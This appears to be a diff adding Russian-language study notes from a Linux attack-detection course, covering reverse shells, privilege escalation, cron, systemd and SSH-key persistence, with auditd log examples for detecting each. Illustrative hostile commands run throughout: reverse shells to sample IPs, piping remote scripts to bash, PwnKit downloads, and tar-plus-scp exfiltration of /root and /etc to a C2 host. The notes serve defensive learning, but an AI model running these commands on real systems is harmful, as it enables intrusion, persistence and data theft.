@@ -176,3 +176,185 @@ ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
 ### Предупреждения от антивируса
 - EDR или антивирус создает предупреждение о новом подозрительном процессе или файле
 
+# Более сложные и глубокие атаки и их обнаружение
+## Reverse Shells
+Злоумышленники которые проникают через ssh получают удобный терминал с цветовой индикацией, автозавершением и поддержкой ctrl+c. Однако не каждое нарушение безопасности обеспечивает полнофункциональный терминал. При первоначальном доступе через эксплоит или веб уязвимость злоумышленники могут столкнуться с ограничениями: некорректный вывод команд, задержки выполнения и таймауты, ограничение скорости, сетевые ограничения и многое другое. ![[Pasted image 20260611162940.png]]
+Чтобы обойти ограничения злоумышленники создают Reverse Shell, то есть сеанс от жертвы к злоумышленнику.
+
+| Команда на машине жертвы                                               | Пояснение                                                                               |
+| ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
+| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`                            | Жертва принудительно подключается к 10.10.10.10:1337 и запускает `bash` для атакующего. |
+| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Альтернатива через socat. Атакующий слушает на 10.20.20.20:2525.                        |
+| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`   | Альтернатива через Python. Атакующий слушает на 10.30.30.30:80.                         |
+## Обнаружение Revers shells
+пример логов для обнаружения 
+
+```shell
+root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...] 
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
+ 
+root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree 
+type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...] 
+type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec
+ 
+root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe 
+type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py 
+type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
+```
+
+после того как Revers Shell поставлен, обычно следует фаза разведки. При этом мы можем перечислить все команды, исходящие из запущенного шела, построив дерево процессов
+
+```shell
+root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...] 
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec 
+
+root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes 
+type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a 
+type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la . [...]
+```
+
+## Повышение привилегий
+Еще одним препятствием для злоумышленников являются недостаточные привилегии, первоначальный доступ не всегда означает полную компрометацию, веб атаки и эксплоиты часто начинают с www-data либо пользователями с еще более ограниченными правами. В этом случае злоумышленникам требуется повышение привилегий, которых можно достигнуть разными способами. 
+
+Например чтобы получить доступ к root злоумышленники могут:
+
+| Предшествующее обнаружение (ЕСЛИ)                              | Повышение привилегий (ТОГДА)                                                            |
+| -------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
+| `uname -a` показывает старую непропатченную Ubuntu 16.04       | Запустить эксплойт PwnKit: `wget http://bad.thm/pwnkit.sh \| bash`                      |
+| `find /bin -perm 4000` обнаруживает бинарь `env` с флагом SUID | Использовать SUID-уязвимость для получения root: `/bin/env /bin/bash -p`                |
+| `ls /etc/ssh` раскрывает незащищённый файл `ssh-backup-key`    | Попытаться использовать файл для получения root: `ssh root@127.0.0.1 -i ssh-backup-key` |
+## Обнаружение повышения привилегий 
+Обнаружить повышение привилегий достаточно тяжело потому что их много и они разные это могут быть: Десятки SUID misconfig и тысячи уязвимостей ПО, которые могут быть эксплуатированы уникальным образом. Таким образом более универсальный подход это обнаружение окружающих событий. Например рассмотрим атаку, которая состоит из 3 этапов
+- Развдека
+- Повышение привилегий
+- И эксфильтрация после получения доступа
+
+```bash
+# Detection 1: A Spike of Discovery Commands
+whoami                                                # Returns "www-data" user
+id; pwd; ls -la; crontab -l                           # Basic initial Discovery
+ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
+uname -r                                              # Returns an old 4.4 kernel
+
+# Detection 2: A Download to Temp Directory
+wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
+gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
+chmod +x /tmp/pwnkit                                  # Making exploit executable
+/tmp/pwnkit                                           # Trying to use the exploit
+
+# Detection 3: Data Exfiltration With SCP
+whoami                                                # Now returns "root" user
+tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
+scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
+```
+
+Даже если вы не знаете точных механик работы эксплоита вы можете обнаружить аномалии, используя более распространенные индикаторы атак. После обнаружения подозрительной активности вы можете подтвердить, удалось ли повысить привилегии, сравнив фактических пользователей до и после эксплоита. Если пользователи различаются значит злоумышленник получил повышенные привилегии
+
+Пример такой эксплуатации:
+```shell
+root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field) 
+type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit 
+type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec 
+
+root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field) 
+type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash 
+type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec 
+
+root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user 
+type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami 
+type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
+```
+
+## Persistence in Linux
+
+### Cron Persistence
+Cron Jobs похожи на запланированный задачи в Windows они легко запускают процесс по расписанию и это один из самых популярных методов.
+Пример:
+
+```bash
+# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
+@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
+```
+
+```bash
+# A simplified command that adds the cron job to /etc/cron.d/root
+echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
+```
+
+### Systemd Persistence
+Сервис Systemd самый критичный компонент системы. В наши дни DNS и SSH и практически все веб серверы организованы как отдельные системы. .service файлы находятся в `/lib/systemd/system` или `/etc/systemd/system` папках. Вместе с рут привилегиями вы можете создать свой собственный сервис, так же как и злоумышленники. Например:
+
+```bash
+# A simplified content of /lib/systemd/system/cloud-online.service file
+[Unit]
+Description=Initial cloud-online job    # Fake description to mimic a trusted service
+[Service]
+ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
+```
+
+### Обнаружение persistence 
+Задания крон и службы systemd устанавливаются как простые текстовые файлы, что означает что вы можете отслеживать их изменения с помощью auditd. Кроме того, закрепление можно обнаружить отслеживая задания связанных процессов в частности, crontab для управления заданиями cron и systemctl для управления службами
+
+| Действие | Объекты мониторинга |
+|---|---|
+| Отслеживать изменения в файлах cron-заданий | `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*`, `/var/spool/crontab/*` |
+| Отслеживать изменения в папках systemd | `/lib/systemd/system/*`, `/etc/systemd/system/*` и менее распространённые расположения |
+| Отслеживать связанные процессы | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>` |
+```shell
+root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd 
+type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service 
+type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service 
+type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/ 
+
+type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd 
+
+root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command 
+type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e 
+type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
+``` 
+## Account Persistence  
+### New User Account
+Если ssh доступ закрыт, злоумышленники могут создать новую учетную запись пользователя, добавить ее в привилегированную группу, а затем использовать для дальнейших подключений по SSH. Обнаружить так же не особо сложно, поскольку можно отслеживать события создания пользователя в журналах аутентификации, а затем восстановить полное дерево процессов с помощью auditd
+
+Пример:
+
+```shell
+root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod' 
+
+2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001 
+2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash 
+2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo' 
+2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
+```
+
+### Backdoored SSH Keys
+Еще один метод сохранения учетной записи - это создание бекдора для SSH ключей одного из пользователей и использование из для будущих входов в систему вместо пароля. 
+Этот метод сложно обнаружить IT специалистам потому что опасные ключи могут сливаться с легитимными
+
+```shell
+# Adding SSH backdoor to the authorized_keys 
+root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys 
+
+# It's hard to guess which key is a backdoor! 
+root@thm-vm:~$ cat ~/.ssh/authorized_keys ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key 
+ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key 
+ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
+```
+
+По умолчанию авторизированные открытые ключи SSH хранятся в файле `~/.ssh/authorized_keys` каждого пользователя, поэтому лучший способ отслеживать их с помощью auditd. Обратите внимание, что полагаться на события создания процессов неэффективно, поскольку существует множество способ изменения ключей SSH, некоторые корректно отслеживаются например auditd. Например `echo [ket]>> ~/.ssh/authorized_keys` не будет записана в лог, потому что `echo` это встроенная команда оболочки
+
+```shell
+# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"  
+# Note how the malicious "echo" command is logged simply as "bash" 
+root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys 
+type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash 
+type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys 
+type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/ 
+type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
+```
+
+### Application Persistence
+представьте себе веб-сайт WordPress где учетная запись администратора взломана. Обладая правами администратора, злоумышленники могут добавить бэкдор на веб сайт и выполнять команды через него - без заданий cron или SSH-ключей. Более того, поскольку сохранение активности происходит на уровне приложения auditd и системные журналы часто его не видят
+![[Pasted image 20260611180934.png]]
